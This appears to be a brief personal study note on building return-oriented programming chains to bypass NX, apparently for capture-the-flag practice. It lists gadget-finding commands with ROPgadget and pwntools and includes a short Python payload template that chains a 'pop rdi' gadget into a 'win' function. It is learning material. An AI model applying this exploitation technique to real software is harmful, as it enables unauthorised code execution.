## NX on
- gadget: code ends w `ret`, eg `pop; ret`
- ROP chain: arrange gadgets + func addrs on stack
- find offset
- find gadgets:
	- `ROPgadget --binary <file_namne> | grep "pop rdi"`  : gdb
	- `rop = ROP(elf)` : pwntool
- build ROP chain, eg `win(arg)`
	``` python
	payload = b"A"*offset
	payload += p64(pop_rdi)
	payload += p64(arg)
	payload += p64(win)
	```
- if arg = a value, not pointer, rcm using dummy values: 0xbeefbeef, 0xdeaddaded, 0xc0d3c0d3...
![[ROP-1.png]]
![[ROP-2.png]]